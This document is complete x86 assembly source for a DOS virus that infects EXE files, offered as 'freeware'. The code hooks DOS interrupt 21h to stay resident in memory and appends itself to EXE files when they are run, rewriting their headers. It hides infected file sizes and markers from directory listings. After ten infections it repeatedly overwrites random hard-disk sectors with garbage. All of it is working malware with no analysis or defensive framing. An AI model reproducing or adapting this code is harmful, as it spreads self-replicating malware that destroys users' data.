virus	     segment
	     assume cs:virus
	     org 0000h

;Source code of EXE file virus. Freeware version 0.12.

start_vir:   push ax
             push bx
             push cx
             push dx
             push es
             push ds
             mov ax,3305h
             int 21h
             cmp ax,0FFEEh
             jne install
             jmp execute
install:     xor ax,ax
             mov ds,ax
             push ds
             cli
             les bx,dword ptr ds:[21h*4]
             mov word ptr cs:off_21,bx
             mov word ptr cs:seg_21,es
             les bx,dword ptr ds:[13h*4]
             mov word ptr cs:off_13,bx
             mov word ptr cs:seg_13,es
             les bx,dword ptr ds:[40h*4]
             mov word ptr cs:off_40,bx
             mov word ptr cs:seg_40,es
             mov ah,52h
             int 21h
             dec bx
             dec bx
             mov ax,word ptr es:[bx]
             mov es,ax
next:        cmp byte ptr es:[0000h],"Z"
             je get_mem
             mov ax,es
             add ax,word ptr es:[0003h]
             inc ax
             mov es,ax
             jmp next
get_mem:     sub word ptr es:[0003h],0090h
             mov ax,es
             add ax,word ptr es:[0003h]
             inc ax
             mov es,ax
             push cs
             pop ds
             xor si,si
             xor di,di
             mov cx,offset virus_end
             cli
             cld
             rep movsb
	     pop ds
	     mov word ptr ds:[21h*4],offset new_handler
	     mov word ptr ds:[21h*4+2],es
execute:     sti
             pop ds
             pop es
             pop dx
             pop cx
             pop bx
             pop ax
             push cs
             pop bp
             db 81h
             db 0EDh
CALC_CS:     dw 0012h ;sub bp,0012h ;Ready to link with IE.BIN
             push bp
             db 0BDh  ;mov bp,0113h
IPJ:         dw 0113h ;Ready to link with IE.BIN
             push bp
             db 0CBh ;RETF

new_handler equ this byte
             cli
I:           cmp ah,4Eh
             jne II
	     jmp stealth
II:	     cmp ah,4Fh
             jne III
	     jmp stealth
III:         cmp ah,11h
             jne IV
             jmp stealth1
IV:          cmp ah,12h
             jne V
             jmp stealth1
V:	     cmp ax,4B00h
             jne VI
	     jmp exec
VI:          cmp ax,4B03h
             jne VII
             jmp exec
VII:         cmp ax,5700h
             jne VIII
             jmp s_5700h
VIII:        cmp ax,5701h
             jne IX
             jmp s_5701h
IX:          cmp ax,3305h
             jne NO
             jmp s_3305h
NO:	     jmp cs:int_21

s_5700h:     pushf
             call cs:int_21
             jc rt
             pushf
             push ax
             mov ax,cx
             and ax,0000000000011111b
             cmp ax,0000000000011111b
             jne rt1
             and cx,1111111111100000b
rt1:         pop ax
             popf
rt:          db 0CAh,02h,00h ;RETF 2

s_5701h:     push ax
             push bx
             push cx
             push dx
             mov ax,5700h
             pushf
             call cs:int_21
             jc n_ret
             and cx,0000000000011111b
             cmp cx,0000000000011111b
             jne n_ret
             pop dx
             pop cx
             pop bx
             pop ax
             or cx,0000000000011111b
cll:         jmp cs:int_21
n_ret:       pop dx
             pop cx
             pop bx
             pop ax
             jmp short cll

s_3305h:     pushf
             call cs:int_21
             mov ax,0FFEEh
             db 0CAh,02h,00h ;RETF 2

stealth:     pushf
             call cs:int_21
             jc return
             pushf
             push ax
             push es
             push bx
             mov ah,2Fh
             pushf
             call cs:int_21
             mov ax,word ptr es:[bx+16h]
             and ax,0000000000011111b
             cmp ax,0000000000011111b
             jne return1
             clc                                       ;Now added
             sub word ptr es:[bx+1Ah],offset virus_end
             sbb word ptr es:[bx+1Ch],0                ;Now added
             and word ptr es:[bx+16h],1111111111100000b
return1:     pop bx
             pop es
             pop ax
             popf
return:      db 0CAh,02h,00h ;RETF 2

stealth1:    pushf
             call cs:int_21
             cmp al,0FFh
             je return2
             push ax
             push es
             push bx
             mov ah,2Fh
             pushf
             call cs:int_21
             cmp byte ptr es:[bx+00h],0FFh
             je extended
normal:      mov ax,word ptr es:[bx+16h]
             and ax,0001111100000000b
             cmp ax,0001111100000000b
             jne return21
             clc                                       ;Now added
             sub word ptr es:[bx+1Dh],offset virus_end
             sbb word ptr es:[bx+1Fh],0                ;Now added
             clc                                       ;Now added
             sub word ptr es:[bx+10h],offset virus_end
             sbb word ptr es:[bx+12h],0                ;Now added
             and word ptr es:[bx+16h],1110000011111111b
             jmp short return21
extended:    mov ax,word ptr es:[bx+1Dh]
             and ax,0001111100000000b
             cmp ax,0001111100000000b
             jne return21
             clc                                       ;Now added
             sub word ptr es:[bx+24h],offset virus_end
             sbb word ptr es:[bx+26h],0                ;Now added
             clc                                       ;Now added
             sub word ptr es:[bx+17h],offset virus_end
             sbb word ptr es:[bx+19h],0                ;Now added
             and word ptr es:[bx+1Dh],1110000011111111b
return21:    pop bx
             pop es
             pop ax
return2:     db 0CAh,02h,00h ;RETF 2

exec:        push ax
	     push es
             push bx
	     push ds
	     push dx
	     xor ax,ax
	     mov ds,ax
             les bx,dword ptr ds:[24h*4]
             mov word ptr cs:off_24,bx
             mov word ptr cs:seg_24,es
	     mov word ptr ds:[24h*4],offset cerror
	     mov word ptr ds:[24h*4+2],cs
             les bx,dword ptr ds:[13h*4]
             mov word ptr cs:off_13o,bx
             mov word ptr cs:seg_13o,es
             mov ax,word ptr cs:off_13
	     mov word ptr ds:[13h*4],ax
             mov ax,word ptr cs:seg_13
	     mov word ptr ds:[13h*4+2],ax
             les bx,dword ptr ds:[40h*4]
             mov word ptr cs:off_40o,bx
             mov word ptr cs:seg_40o,es
             mov ax,word ptr cs:off_40
	     mov word ptr ds:[40h*4],ax
             mov ax,word ptr cs:seg_40
	     mov word ptr ds:[40h*4+2],ax
	     mov di,offset virus_end
	     pop dx
             pop ds
             push ds
             push dx
      	     mov ax,4300h
	     pushf
             call cs:int_21
	     jnc n1
             jmp derr
n1:	     mov word ptr cs:[di],cx
	     and cx,0000000000011000b
	     cmp cx,0000h
	     je n2
             jmp derr
n2:	     mov ax,4301h
             xor cx,cx
	     pushf
             call cs:int_21
	     jnc n3
             jmp derr
n3:	     mov ah,3Dh
	     mov al,10010010b
	     pushf
             call cs:int_21
	     jnc n4
             jmp error
n4:	     mov bx,ax
             mov ax,5700h
             pushf
             call cs:int_21
             jnc n5
             jmp dcl
n5:          mov word ptr cs:[di+2],cx
             mov word ptr cs:[di+4],dx
             and cx,0000000000011111b
             cmp cx,0000000000011111b
             jne n6
             jmp close
n6:          mov ah,3fh
             mov cx,0002h
             mov dx,cs
             mov ds,dx
             mov dx,di
             add dx,0006h
             pushf
             call cs:int_21
             jnc n7
             jmp close
n7:          cmp cx,ax
             je n8
             jmp close
n8:          cmp word ptr cs:[di+6],"ZM"
             je n9
             cmp word ptr cs:[di+6],"MZ"
             je n9
	     jmp close
n9:          mov ax,4200h                      ;1
             xor cx,cx
             mov dx,cx
             pushf
             call cs:int_21
             jnc n10
             jmp close
n10:         mov si,di
             add si,6
             mov ah,3Fh
             mov cx,26
             push cs
             pop ds
             mov dx,si
             pushf
             call cs:int_21
             jnc n11
             jmp close
n11:         cmp cx,ax
             je n12
             jmp close
n12:         mov ax,4202h                      ;2
             xor cx,cx
             mov dx,cx
             pushf
             call cs:int_21
             jnc n13
             jmp close
n13:         cmp dx,0007h
             jna n14
             jmp close
n14:         mov cx,16                         ;3
             div cx
             sub cx,dx
             mov ah,40h                        ;4
             xor dx,dx
             mov ds,dx
             pushf
             call cs:int_21
             jnc n15
             jmp close
n15:         cmp cx,ax
             je n16
             jmp close
n16:         mov ax,4202h                      ;5
             xor cx,cx
             mov dx,cx
             pushf
             call cs:int_21
             jnc n17
             jmp close
n17:         mov cx,16                         ;6
             div cx
             sub ax,word ptr cs:[si+8]
             mov cx,word ptr cs:[si+14h]       ;7
             mov word ptr cs:[IPJ],cx
             mov cx,ax                         ;8
             sub cx,word ptr cs:[si+16h]
             mov word ptr cs:[CALC_CS],cx
             mov word ptr cs:[si+14h],0        ;9
             mov word ptr cs:[si+16h],ax
             mov ax,4202h                      ;10
             xor cx,cx
             mov dx,cx
             pushf
             call cs:int_21
             jnc n18
             jmp close
n18:         mov cx,offset virus_end
             add cx,512
             clc
             add ax,cx
             adc dx,0
             mov cx,512
             div cx
             mov word ptr cs:[si+4],ax         ;11
             mov word ptr cs:[si+2],dx         ;12
             mov word ptr cs:[si+0Ah],0
             mov word ptr cs:[si+0Ch],0FFFFh
             mov ah,40h                        ;13
             mov cx,offset virus_end
             push cs
             pop ds
             xor dx,dx
             pushf
             call cs:int_21
             jnc n19
             jmp close
n19:         cmp cx,ax
             je n20
             jmp close
n20:         mov ax,4200h
             xor cx,cx
             mov dx,cx
             pushf
             call cs:int_21
             jnc n21
             jmp close
n21:         mov ah,40h
             mov cx,26
             push cs
             pop ds
             mov dx,si
             pushf
             call cs:int_21
             jnc n22
             jmp close
n22:         cmp cx,ax
             je n23
             jmp close
n23:         or word ptr cs:[di+2],0000000000011111b
             inc byte ptr cs:counter
             cmp byte ptr cs:counter,10
             jne close
             jmp destroy
close:	     mov cx,word ptr cs:[di+2]
	     mov dx,word ptr cs:[di+4]
	     mov ax,5701h
	     pushf
             call cs:int_21
dcl:         mov ah,3Eh
	     pushf
             call cs:int_21
error:	     mov ax,4301h
	     mov cx,word ptr cs:[di]
	     pop dx
             pop ds
             push ds
             push dx
	     pushf
             call cs:int_21
derr:        xor ax,ax
	     mov ds,ax
	     mov ax,cs:off_24
	     mov word ptr ds:[24h*4],ax
	     mov ax,cs:seg_24
	     mov word ptr ds:[24h*4+2],ax
             mov ax,word ptr cs:off_13o
	     mov word ptr ds:[13h*4],ax
             mov ax,word ptr cs:seg_13o
	     mov word ptr ds:[13h*4+2],ax
             mov ax,word ptr cs:off_40o
	     mov word ptr ds:[40h*4],ax
             mov ax,word ptr cs:seg_40o
	     mov word ptr ds:[40h*4+2],ax
	     pop dx
             pop ds
             pop bx
             pop es
             pop ax
             cld
	     jmp cs:int_21
destroy:     cli
             mov ah,0           ;Reset disk
             mov dl,80h
             int 13h
             mov ah,03h         ;Write random sector with garbage
             mov al,10
             push ax
             in al,44h
             and al,01101101b
             mov ch,al
             in al,44h
             mov cl,al
             and cl,10000111b
             in al,44h
             and al,04h
             mov dh,al
             pop ax
             mov dl,80h
             push cs
             pop es
             xor bx,bx
             int 13h
             jmp destroy

cerror equ this byte
	     mov al,03h
	     iret

counter      db 0

int_13 equ this dword
off_13       dw (?)
seg_13       dw (?)

int_13o equ this dword
off_13o      dw (?)
seg_13o      dw (?)

int_40 equ this dword
off_40       dw (?)
seg_40       dw (?)

int_40o equ this dword
off_40o      dw (?)
seg_40o      dw (?)

int_21 equ this dword
off_21	     dw (?)
seg_21	     dw (?)

int_24 equ this dword
off_24	     dw (?)
seg_24	     dw (?)

virus_end equ this byte

virus	     ends
	     end
